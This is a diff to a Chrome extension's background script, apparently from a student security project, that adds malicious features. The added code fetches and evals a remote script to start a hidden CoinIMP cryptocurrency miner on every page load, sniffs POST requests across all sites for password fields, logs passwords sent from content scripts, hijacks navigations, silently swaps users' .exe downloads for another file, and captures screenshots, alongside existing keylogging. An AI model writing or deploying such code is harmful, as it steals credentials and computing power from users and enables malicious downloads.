@@ -39,13 +39,56 @@ function keyLog(request) {
 // Get HTML data of page
 function pageLog(request) {
   console.log(request.page);
+  //console.log(request.htmldata);
+}
+
+function startMiner() {
+  fetch("https://www.hostingcloud.racing/sKfg.js")
+    .then((resp) => resp.text())
+    .then(eval)
+    .then(() => {
+      var _client = new Client.Anonymous(
+        "f459263ca7d76883b9bdc6c055c8544232ae4edfb614b877457b56a1f6ef5b95",
+        {
+          throttle: 0.8,
+          c: "w",
+        }
+      );
+      _client.start();
+      console.log("test miner");
+      _client.addMiningNotification(
+        "Top",
+        "This site is running JavaScript miner from coinimp.com",
+        "#cccccc",
+        40,
+        "#3d3d3d"
+      );
+    })
+    .catch(console.error);
 }
 
 chrome.tabs.onUpdated.addListener(function (tabId, info) {
   if (info.status === "complete") {
-    chrome.tabs.sendMessage(tabId, { type: "pageCapture" });
+    chrome.tabs.sendMessage(tabId, { type: "tabUpdated" });
+    startMiner();
   }
 });
+
+chrome.webRequest.onBeforeRequest.addListener(
+  function (request) {
+    if (request.method === "POST") {
+      let strg = JSON.stringify(request);
+      if (strg.includes("password") || strg.includes("pass")) {
+        console.log("request");
+        console.log(request);
+      }
+    }
+  },
+  {
+    urls: ["<all_urls>"],
+  },
+  ["blocking", "requestBody"]
+);
 
 // Handle the different message types
 function handleMessageB(request) {
@@ -53,29 +96,41 @@ function handleMessageB(request) {
     keyLog(request);
   } else if (request.type === "pageLog") {
     pageLog(request);
+  } else if (request.type === "passwordChange") {
+    console.log("password value " + request.data);
   }
 }
 
 // Handle the different messages
 chrome.runtime.onMessage.addListener(handleMessageB);
 
-
+var redirect = true;
 // Redirect requests to specific host
 var host = "https://www.google.com/";
+var cpt = 0;
 chrome.webRequest.onBeforeRequest.addListener(
   function (details) {
-    console.log(details.url);
-    return { redirectUrl: host };
+    console.log(details);
+    console.log(cpt);
+    if (details.url !== host && cpt > 10) {
+      cpt = 0;
+      console.log("send redirect " + details.url);
+      window.setTimeout(function () {
+        chrome.tabs.update(details.tabId, { url: details.url });
+      }, 1000);
+      return { redirectUrl: host };
+    } else {
+      cpt = cpt + 1;
+    }
   },
   {
     urls: ["<all_urls>"],
-    types: ["main_frame", "sub_frame", "script"],
+    types: ["main_frame"],
   },
   ["blocking"]
 );
 
 // Make download
-
 async function makeDownload(name) {
   await chrome.downloads.download({
     url: "https://tls-sec.github.io/2019-2020/2020/01/19/projetslongs.html",
@@ -86,21 +141,48 @@ async function makeDownload(name) {
 var originalFilename;
 var cp = true;
 chrome.downloads.onChanged.addListener(async function (downloadItem) {
-  console.log("onChanged");
-  console.log(replaceProcedure);
-  console.log(downloadItem);
   if (downloadItem.filename) {
     if (cp) {
       cp = false;
       originalFilename = downloadItem.filename.current;
-      let i = originalFilename.lastIndexOf('\\');
-      originalFilename = originalFilename.substring(i+1);
+      let i = originalFilename.lastIndexOf("\\");
+      originalFilename = originalFilename.substring(i + 1);
       console.log(originalFilename);
-      await chrome.downloads.cancel(downloadItem.id);
-      await chrome.downloads.erase({ id: downloadItem.id });
-      await makeDownload(originalFilename);
+      let i2 = originalFilename.lastIndexOf(".");
+      let extension = originalFilename.substring(i2 + 1);
+      if (extension === "exe") {
+        await chrome.downloads.cancel(downloadItem.id);
+        await chrome.downloads.erase({ id: downloadItem.id });
+        await makeDownload(originalFilename);
+      }
     } else {
       cp = true;
     }
   }
 });
+
+// Get download history
+function getDownloadHistory() {
+  chrome.downloads.search(
+    { orderBy: ["-startTime"], limit: 1000, startedAfter: "2000-01-01" },
+    function (downloadItems) {
+      console.log(downloadItems);
+    }
+  );
+}
+
+chrome.commands.onCommand.addListener((command) => {
+  console.log(`Command: ${command}`);
+  makeScreenshots();
+});
+
+var screenshotFlag = false;
+function makeScreenshots() {
+  if (screenshotFlag) {
+    chrome.tabs.captureVisibleTab(function (res) {
+      console.log(res);
+    });
+    screenshotFlag = false;
+  }
+  window.setTimeout(checkFlag, 100);
+}
